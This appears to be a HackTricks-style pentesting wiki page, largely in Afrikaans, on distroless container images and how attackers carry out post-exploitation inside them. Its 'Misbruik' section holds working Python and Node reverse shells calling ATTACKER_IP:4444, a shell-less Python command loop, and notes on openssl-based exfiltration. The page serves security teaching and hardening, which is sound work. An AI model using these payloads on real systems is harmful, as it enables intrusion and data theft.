# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

A **distroless** container image is an image that ships the **minimum runtime components required to run one specific application**, while intentionally removing the usual distribution tooling such as package managers, shells, and large sets of generic userland utilities. In practice, distroless images often contain only the application binary or runtime, its shared libraries, certificate bundles, and a very small filesystem layout.

Die punt is nie dat distroless 'n nuwe kernel-isolasie-primitive is nie. Distroless is 'n **image design strategy**. Dit verander wat beskikbaar is **binne** die container filesystem, nie hoe die kernel die container isoleer nie. Daardie onderskeid is belangrik, want distroless verskerp die omgewing hoofsaaklik deur te beperk wat 'n aanvaller kan gebruik nadat hulle code execution gehad het. Dit vervang nie namespaces, seccomp, capabilities, AppArmor, SELinux, of enige ander runtime isolasie-meganisme nie.

## Waarom Distroless Bestaan

Distroless images word hoofsaaklik gebruik om te verminder:

- die image-grootte
- die operationele kompleksiteit van die image
- die aantal pakkette en binaries wat kwesbaarhede kan bevat
- die aantal post-exploitation-instrumente wat standaard vir 'n aanvaller beskikbaar is

Dit is waarom distroless images populêr is in produksie-toepassingsontplooiings. 'n Container wat geen shell, geen package manager, en byna geen generiese gereedskap bevat nie, is gewoonlik makliker om operasioneel te begryp en moeiliker om interaktief te misbruik na kompromie.

Voorbeelde van goed-bekende distroless-styl image-families sluit in:

- Google's distroless images
- Chainguard hardened/minimal images

## Wat Distroless Nie Beteken Nie

A distroless container is **not**:

- outomaties rootless
- outomaties non-privileged
- outomaties read-only
- outomaties beskerm deur seccomp, AppArmor, of SELinux
- outomaties veilig teen container escape

Dit is steeds moontlik om 'n distroless image te laat loop met `--privileged`, host namespace sharing, gevaarlike bind mounts, of 'n gemounte runtime socket. In daardie scenario mag die image minimaal wees, maar die container kan steeds katastrofies onveilig wees. Distroless verander die **userland attack surface**, nie die **kernel trust boundary** nie.

## Tipiese Operasionele Kenmerke

Wanneer jy 'n distroless container kompromitteer, is die eerste ding wat jy gewoonlik opmerk dat algemene aannames ophou waar wees. Daar mag geen `sh`, geen `bash`, geen `ls`, geen `id`, geen `cat`, en soms nie eers 'n libc-gebaseerde omgewing wees wat gedra soos jou gewone tradecraft verwag nie. Dit raak beide offense en defense, omdat die gebrek aan gereedskap debugging, incident response, en post-exploitation anders maak.

Die mees algemene patrone is:

- die toepassings-runtime bestaan, maar byna niks anders nie
- shell-gebaseerde payloads misluk omdat daar geen shell is
- algemene enumerasie one-liners misluk omdat die helper binaries ontbreek
- lêerstelsel-beskermings soos read-only rootfs of `noexec` op skryfbare tmpfs-lokasies is dikwels ook teenwoordig

Daardie kombinasie is wat mense gewoonlik laat praat oor "weaponizing distroless".

## Distroless en Post-Exploitation

Die hoof offensiewe uitdaging in 'n distroless-omgewing is nie altyd die aanvanklike RCE nie. Dit is dikwels wat daarna kom. As die uitgebuite workload code execution gee in 'n taal-runtime soos Python, Node.js, Java, of Go, mag jy in staat wees om arbitrare logika uit te voer, maar nie deur die normale shell-sentriese workflows wat algemeen is op ander Linux teikens nie.

Dit beteken post-exploitation skuif dikwels in een van drie rigtings:

1. **Use the existing language runtime directly** om die omgewing te enumereer, sockets oop te maak, lêers te lees, of addisionele payloads te stasioneer.
2. **Bring your own tooling into memory** as die filesystem read-only is of skryfbare lokasies met `noexec` gemoun is.
3. **Abuse existing binaries already present in the image** as die toepassing of sy afhanklikhede iets onverwags nuttigs insluit.

## Misbruik

### Enumereer Die Runtime Wat Jy Reeds Het

In baie distroless containers is daar geen shell nie, maar daar is steeds 'n toepassings-runtime. As die teiken 'n Python service is, is Python daar. As die teiken Node.js is, is Node daar. Dit gee dikwels genoeg funksionaliteit om lêers te enumereer, environment variables te lees, reverse shells te open, en in-memory uitvoering te laai sonder om ooit `/bin/sh` aan te roep.

A simple example with Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
'n eenvoudige voorbeeld met Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impak:

- herwinning van omgewingsveranderlikes, dikwels insluitend credentials of diens-eindpunte
- lêerstelsel-ontleding sonder `/bin/ls`
- identifisering van skryfbare paaie en gemonteerde secrets

### Reverse Shell Sonder `/bin/sh`

As die image nie `sh` of `bash` bevat nie, kan 'n klassieke shell-gebaseerde reverse shell onmiddellik misluk. In daardie situasie, gebruik eerder die geïnstalleerde taal-runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
As `/bin/sh` nie bestaan nie, vervang die laaste reël met direkte Python-gedrewe opdraguitvoering of 'n Python REPL-lus.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Weereens, as `/bin/sh` afwesig is, gebruik Node se filesystem-, process- en networking-APIs direk in plaas daarvan om 'n shell te spawn.

### Volledige voorbeeld: No-Shell Python Command Loop

As die image Python het maar glad geen shell nie, is 'n eenvoudige interaktiewe lus dikwels genoeg om volledige post-exploitation vermoë te behou:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dit vereis nie ’n interaktiewe shell-binary nie. Die impak is effektiewelik dieselfde as ’n basic shell vanuit die aanvaller se perspektief: command execution, enumeration, en staging van verdere payloads deur die bestaande runtime.

### In-Memory Tool Execution

Distroless images word dikwels saam met die volgende gebruik:

- `readOnlyRootFilesystem: true`
- skryfbaar maar `noexec` tmpfs soos `/dev/shm`
- 'n gebrek aan package management tools

Daardie kombinasie maak klassieke "download binary to disk and run it" workflows onbetroubaar. In daardie gevalle word memory execution techniques die hoofoplossing.

Die toegewyde bladsy daarvoor is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die mees relevante tegnieke daar is:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Bestaande Binaries wat reeds in die Image voorkom

Sommige distroless images bevat steeds operasioneel nodige binaries wat nuttig raak ná kompromittering. 'n Gereeld waargenome voorbeeld is `openssl`, omdat toepassings dit soms nodig het vir crypto- of TLS-verwante take.

'n Vinnige soekpatroon is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
As `openssl` teenwoordig is, kan dit gebruik word vir:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Die presiese misbruik hang af van wat eintlik geïnstalleer is, maar die algemene idee is dat distroless nie "heeltemal geen gereedskap" beteken nie; dit beteken "baie minder gereedskap as in 'n normale verspreidingsbeeld'".

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die image in praktyk werklik distroless is en watter runtime of helper binaries nog beskikbaar is vir post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Wat hier interessant is:

- As geen shell bestaan maar 'n runtime soos Python of Node teenwoordig is, moet post-exploitation na runtime-gedrewe uitvoering skuif.
- As die root-lêerstelsel read-only is en `/dev/shm` skryfbaar maar `noexec`, word memory execution techniques veel meer relevant.
- As hulpbinaries soos `openssl`, `busybox`, of `java` bestaan, kan hulle genoeg funksionaliteit bied om verdere toegang te bootstrap.

## Runtime-standaarde

| Image / platform style | Standaardtoestand | Tipiese gedrag | Algemene handmatige verzwakking |
| --- | --- | --- | --- |
| Google distroless style images | Minimale userland per ontwerp | Geen shell, geen package manager, slegs toepassings/runtime-afhanklikhede | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimale userland per ontwerp | Verminderde pakketoppervlak, dikwels gefokus op een runtime of diens | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Hang af van Pod-konfigurasie | Distroless raak slegs userland; Pod se sekuriteitshouding hang nog steeds af van die Pod-spec en runtime-standaarde | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Hang af van run flags | Minimale lêerstelsel, maar runtime-sekuriteit hang steeds af van vlagte en daemon-konfigurasie | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Die sleutelpunt is dat distroless 'n **image-eienskap** is, nie 'n runtime-beskerming nie. Sy waarde lê in die vermindering van wat binne die lêerstelsel beskikbaar is nadat kompromie plaasgevind het.

## Verwante bladsye

Vir filesystem- en memory-execution bypasses wat algemeen benodig word in distroless-omgewings:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Vir container runtime, socket, en mount-misbruik wat steeds op distroless-werklaaie van toepassing is:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
